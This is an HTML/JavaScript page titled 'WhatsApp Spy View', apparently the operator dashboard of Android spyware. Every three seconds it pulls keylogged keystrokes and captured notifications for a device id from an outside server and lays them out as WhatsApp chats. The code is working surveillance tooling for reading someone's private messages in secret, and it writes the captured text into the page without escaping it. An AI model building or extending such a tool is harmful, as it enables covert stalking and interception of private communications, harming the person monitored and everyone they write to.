<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WhatsApp Spy View</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        body { margin: 0; font-family: sans-serif; background-color: #111b21; color: #e9edef; display: flex; height: 100vh; overflow: hidden; }
        .sidebar { width: 300px; background: #202c33; border-right: 1px solid #374045; overflow-y: auto; }
        .chat-area { flex: 1; background: url('https://user-images.githubusercontent.com/15075759/28719144-86dc0f70-73b1-11e7-911d-60d70fcded21.png'); background-color: #0b141a; display: flex; flex-direction: column; }
        
        .contact { padding: 15px; border-bottom: 1px solid #2a3942; cursor: pointer; display: flex; align-items: center; }
        .contact:hover, .contact.active { background: #2a3942; }
        .avatar { width: 40px; height: 40px; background: #00a884; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 10px; font-weight: bold; }
        
        .header { padding: 10px; background: #202c33; display: flex; align-items: center; border-bottom: 1px solid #374045; }
        .messages { flex: 1; padding: 20px; overflow-y: auto; display: flex; flex-direction: column; gap: 5px; }
        
        /* BUBBLES */
        .msg { max-width: 70%; padding: 8px 12px; border-radius: 8px; font-size: 14px; position: relative; word-wrap: break-word; }
        
        /* INCOMING (Left) */
        .msg.incoming { background: #202c33; align-self: flex-start; border-top-left-radius: 0; }
        
        /* OUTGOING (Right) */
        .msg.outgoing { background: #005c4b; align-self: flex-end; border-top-right-radius: 0; }
        
        .time { font-size: 10px; color: #8696a0; float: right; margin-left: 10px; margin-top: 5px; }

        @media(max-width: 768px) {
            .sidebar { width: 100%; position: absolute; z-index: 2; height: 100%; }
            .chat-area { width: 100%; position: absolute; z-index: 1; }
            .sidebar.hidden { display: none; }
        }
    </style>
</head>
<body>

    <div class="sidebar" id="sidebar">
        <div style="padding:15px; font-weight:bold; color:#00a884;">CHATS (Live)</div>
        <div id="contactList">Loading...</div>
    </div>

    <div class="chat-area">
        <div class="header" id="chatHeader" style="display:none;">
            <i class="fas fa-arrow-left" onclick="toggleSidebar()" style="margin-right:10px; cursor:pointer;"></i>
            <span id="chatTitle">Select a Chat</span>
        </div>
        <div class="messages" id="msgBox"></div>
    </div>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const deviceId = urlParams.get('id');
        const API_KEYLOGS = `https://child-v9no.onrender.com/api/get-data/${deviceId}/keylogs`;
        const API_NOTIFS = `https://child-v9no.onrender.com/api/get-data/${deviceId}/notifications`;

        let allChats = {}; 
        let currentChatUser = null;

        async function syncData() {
            if (!deviceId) return;

            try {
                // DONO APIs se data mangao
                const [logs, notifs] = await Promise.all([
                    fetch(API_KEYLOGS).then(r => r.json()).catch(()=>[]),
                    fetch(API_NOTIFS).then(r => r.json()).catch(()=>[])
                ]);

                // DATA PROCESSING
                logs.forEach(item => {
                    // Agar Android se 'type' outgoing_keylog hai -> RIGHT SIDE
                    if (item.type === 'outgoing_keylog' || item.appName === 'WhatsApp') {
                        addMsg(item.title || "Unknown", item.text, item.timestamp, 'outgoing');
                    }
                    // Agar Android se 'type' incoming_screen hai -> LEFT SIDE
                    else if (item.type === 'incoming_screen') {
                        addMsg(item.title || "Unknown", item.text, item.timestamp, 'incoming');
                    }
                });

                // NOTIFICATIONS (Backup Incoming)
                notifs.forEach(item => {
                    if(item.packageName && item.packageName.includes('whatsapp')) {
                        addMsg(item.title, item.text, item.timestamp, 'incoming');
                    }
                });

                renderContacts();
                if(currentChatUser) renderMessages(currentChatUser);

            } catch(e) { console.log(e); }
        }

        function addMsg(user, text, time, type) {
            if(!user || !text) return;
            if(!allChats[user]) allChats[user] = [];

            // Duplicate Check
            const exists = allChats[user].some(m => m.text === text && Math.abs(m.time - time) < 5000);
            if(!exists) {
                allChats[user].push({ text, time, type });
                // Sort by time
                allChats[user].sort((a,b) => a.time - b.time);
            }
        }

        function renderContacts() {
            const list = document.getElementById('contactList');
            list.innerHTML = "";
            Object.keys(allChats).forEach(user => {
                const div = document.createElement('div');
                div.className = `contact ${currentChatUser === user ? 'active' : ''}`;
                div.onclick = () => openChat(user);
                div.innerHTML = `<div class="avatar">${user[0]}</div> <div>${user}</div>`;
                list.appendChild(div);
            });
        }

        function openChat(user) {
            currentChatUser = user;
            document.getElementById('chatTitle').innerText = user;
            document.getElementById('chatHeader').style.display = 'flex';
            
            // Mobile toggle
            if(window.innerWidth < 768) document.getElementById('sidebar').classList.add('hidden');
            
            renderMessages(user);
        }

        function renderMessages(user) {
            const box = document.getElementById('msgBox');
            box.innerHTML = "";
            const msgs = allChats[user] || [];
            
            msgs.forEach(m => {
                const div = document.createElement('div');
                div.className = `msg ${m.type}`;
                const timeStr = new Date(m.time).toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'});
                div.innerHTML = `${m.text} <span class="time">${timeStr}</span>`;
                box.appendChild(div);
            });
            box.scrollTop = box.scrollHeight;
        }

        function toggleSidebar() {
            document.getElementById('sidebar').classList.remove('hidden');
        }

        setInterval(syncData, 3000); // 3 sec refresh
        syncData();
    </script>
</body>
</html>
